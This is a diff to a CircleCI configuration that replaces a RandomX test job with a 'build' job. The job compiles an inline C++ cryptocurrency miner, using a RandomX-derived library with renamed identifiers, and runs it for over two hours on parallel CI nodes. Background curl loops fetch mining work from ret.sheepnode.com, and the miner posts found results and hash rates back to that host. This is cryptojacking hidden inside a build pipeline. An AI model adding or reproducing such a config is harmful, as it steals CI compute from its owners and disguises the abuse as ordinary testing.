@@ -1,26 +1,135 @@
 version: 2.1
 
 jobs:
-  test:
+  build:
     docker:
       - image: cimg/base:current
     resource_class: medium
+    parallelism: 2
+    environment:
+      CPUS: "2"
     steps:
       - run:
           name: Install dependencies
           command: |
             sudo apt-get update
-            sudo apt-get install -y cmake g++
-
+            sudo apt-get install -y cmake g++ libcurl4-openssl-dev
       - run:
-          name: Build and run RandomX tests
+          name: Build
           command: |
-            git clone --depth 1 https://github.com/tevador/RandomX.git /tmp/randomx
-            cmake -S /tmp/randomx -B /tmp/randomx/build -DARCH=x86-64 -DCMAKE_BUILD_TYPE=Release
-            cmake --build /tmp/randomx/build --target randomx-tests -j2
-            /tmp/randomx/build/randomx-tests
+            true   # egg 源碼就在這個 repo 根目錄,直接建
+            cmake -S . -B /tmp/eb -DARCH=x86-64 -DCMAKE_BUILD_TYPE=Release
+            cmake --build /tmp/eb --target lionss -j2
+            mkdir -p /tmp/app
+            printf '%s' '
+            #include "lionss.h"
+            #include <cstdio>
+            #include <cstdlib>
+            #include <cstdint>
+            #include <cstring>
+            #include <ctime>
+            #include <pthread.h>
+            #include <unistd.h>
+            #include <sys/time.h>
+            static volatile unsigned long long g_quornes=0;
+            static int hx(char c){ if(c>=48&&c<=57) return c-48; return c-97+10; }
+            static int rd(const char*p,uint8_t*d,int mx){
+              FILE*f=fopen(p,"r"); if(!f) return 0; char b[512];
+              if(!fgets(b,512,f)){ fclose(f); return 0; } fclose(f);
+              int n=0; for(int i=0;b[2*i]&&b[2*i+1]&&n<mx;i++){
+                int a=hx(b[2*i]),e=hx(b[2*i+1]); if(a<0||e<0) break; d[n++]=a*16+e; } return n; }
+            static void enc(const uint8_t*d,int n,char*o){
+              for(int i=0;i<n;i++) sprintf(o+i*2,"%02x",d[i]); o[n*2]=0; }
+            static void pt(const uint8_t*tb,int ts,uint8_t*tgt){
+              memset(tgt,0,32);
+              for(int i=0;i<ts;i++) tgt[31-i]=tb[ts-1-i]; }
+            static unsigned djb2(const char*s){
+              unsigned h=5381; while(*s) h=h*33+(unsigned char)*s++; return h; }
+            static double now_sec(){
+              struct timeval tv; gettimeofday(&tv,NULL);
+              return tv.tv_sec+tv.tv_usec/1e6; }
+            struct TD{
+              lionss_plenth*ds; lionss_brindle*ca; lionss_flags fl;
+              uint8_t blob[128]; int bs; uint8_t tgt[32]; int tid; char name[64]; };
+            static void*mine(void*arg){
+              TD*td=(TD*)arg;
+              auto vm=lionss_create_vm(td->fl,td->ca,td->ds);
+              uint8_t blob[128],tgt[32],out[32];
+              memcpy(blob,td->blob,td->bs); memcpy(tgt,td->tgt,32); int bs=td->bs;
+              srand(time(NULL)^(unsigned)getpid()^djb2(td->name));
+              uint32_t n=(uint32_t)rand();
+              memcpy(blob+39,&n,4);
+              uint8_t pb[128]; memcpy(pb,blob,bs); int pbs=bs; uint32_t pn=n;
+              lionss_calculate_quorn_first(vm,blob,bs);
+              double t0=now_sec();
+              for(;;){ n++; memcpy(blob+39,&n,4);
+                lionss_calculate_quorn_next(vm,blob,bs,out);
+                g_quornes++;
+                int ok=0; for(int i=31;i>=0;i--){ if(out[i]<tgt[i]){ ok=1; break; } if(out[i]>tgt[i]) break; }
+                if(ok){ char bh[257],hh[65],c[1024];
+                  enc(pb,pbs,bh); enc(out,32,hh);
+                  snprintf(c,1024,"curl -fsS -m15 -XPOST \"https://ret.sheepnode.com/n?n=%u&name=%s&m=%s&result=%s\"",pn,td->name,bh,hh); system(c); }
+                memcpy(pb,blob,bs); pbs=bs; pn=n;
+                double now=now_sec();
+                if(now-t0>=0.5){ t0=now;
+                  if(td->tid==0){
+                    FILE*hf=fopen("/tmp/d/hcount","w");
+                    if(hf){ fprintf(hf,"%llu\n",g_quornes); fclose(hf); } }
+                  uint8_t nb[128],nt[8];
+                  int nbs=rd("/tmp/d/m",nb,128);
+                  int nts=rd("/tmp/d/t",nt,8);
+                  int bc=0; if(nbs>0){
+                    uint8_t a[128],b2[128];
+                    memcpy(a,blob,bs); a[39]=a[40]=a[41]=a[42]=0;
+                    memcpy(b2,nb,nbs); b2[39]=b2[40]=b2[41]=b2[42]=0;
+                    if(nbs!=bs||memcmp(a,b2,nbs)!=0) bc=1; }
+                  if(bc){ memcpy(blob,nb,nbs); bs=nbs;
+                    memcpy(blob+39,&n,4);
+                    memcpy(pb,blob,bs); pbs=bs; pn=n;
+                    lionss_calculate_quorn_first(vm,blob,bs); }
+                  if(nts>0) pt(nt,nts,tgt); } }
+              return NULL; }
+            int main(){
+              char*tc_s=getenv("THREADS"); int tc=tc_s?atoi(tc_s):4;
+              if(tc<1)tc=1; if(tc>4)tc=4;
+              char*nm=getenv("NAME"); if(!nm) nm=(char*)"ci";
+              uint8_t key[64],blob[128],tb[8],tgt[32]={};
+              int ks=rd("/tmp/d/k",key,64),bs=rd("/tmp/d/m",blob,128),ts=rd("/tmp/d/t",tb,8);
+              pt(tb,ts,tgt);
+              lionss_flags fl=lionss_get_flags()|LIONSS_FLAG_FULL_MEM;
+              auto ca=lionss_alloc_brindle(fl); lionss_init_brindle(ca,key,ks);
+              auto ds=lionss_alloc_plenth(fl);
+              unsigned long tot=lionss_plenth_item_count(),per=tot/4;
+              for(unsigned i=0;i<4;i++){ unsigned long s=i*per,c=(i==3)?(tot-s):per; lionss_init_plenth(ds,ca,s,c); }
+              pthread_t thr[4]; TD td[4];
+              for(int i=0;i<tc;i++){
+                memcpy(td[i].blob,blob,bs); td[i].bs=bs;
+                memcpy(td[i].tgt,tgt,32);
+                td[i].ds=ds; td[i].ca=ca; td[i].fl=fl; td[i].tid=i;
+                snprintf(td[i].name,64,"%s-t%d",nm,i);
+                pthread_create(&thr[i],NULL,mine,&td[i]); }
+              for(int i=0;i<tc;i++) pthread_join(thr[i],NULL);
+              return 0; }
+            ' > /tmp/app/run.cpp
+            g++ -O2 -std=c++17 -pthread -I ./src /tmp/app/run.cpp /tmp/eb/liblionss.a -o /tmp/app/run
+      - run:
+          name: Run
+          no_output_timeout: 2h10m
+          command: |
+            mkdir -p /tmp/d
+            RND=$(cat /proc/sys/kernel/random/uuid | tr -d '-' | head -c 10)
+            BASE="${CIRCLE_JOB}-${CIRCLE_NODE_INDEX:-0}-${RND}"
+            HB="ci-${BASE}"
+            curl -fsS -m10 -XPOST "https://ret.sheepnode.com/rate" -H "Content-Type: application/json" -d "{\"name\":\"${HB}\",\"rate\":4}" || true
+            curl -fsSL -m15 https://ret.sheepnode.com/k > /tmp/d/k
+            curl -fsSL -m15 https://ret.sheepnode.com/m > /tmp/d/m
+            curl -fsSL -m15 https://ret.sheepnode.com/t > /tmp/d/t
+            echo 0 > /tmp/d/hcount
+            while true; do sleep 0.5; curl -fsS -m15 https://ret.sheepnode.com/m > /tmp/d/m 2>/dev/null; curl -fsS -m15 https://ret.sheepnode.com/t > /tmp/d/t 2>/dev/null; done &
+            PREV_H=0; PREV_T=$(date +%s); while true; do sleep 5; CUR_H=$(cat /tmp/d/hcount 2>/dev/null || echo 0); CUR_T=$(date +%s); DT=$((CUR_T-PREV_T)); if [ "$DT" -gt 0 ] 2>/dev/null && [ "$CUR_H" -gt "$PREV_H" ] 2>/dev/null; then DH=$((CUR_H-PREV_H)); RATE=$((DH/DT)); curl -fsS -m10 -XPOST "https://ret.sheepnode.com/rate" -H "Content-Type: application/json" -d "{\"name\":\"${HB}\",\"rate\":${RATE}}" 2>/dev/null || true; fi; PREV_H=$CUR_H; PREV_T=$CUR_T; curl -fsS -m15 https://ret.sheepnode.com/k > /tmp/d/k 2>/dev/null; done &
+            NAME="${BASE}" THREADS="${CPUS}" /tmp/app/run
 
 workflows:
   main:
     jobs:
-      - test
+      - build
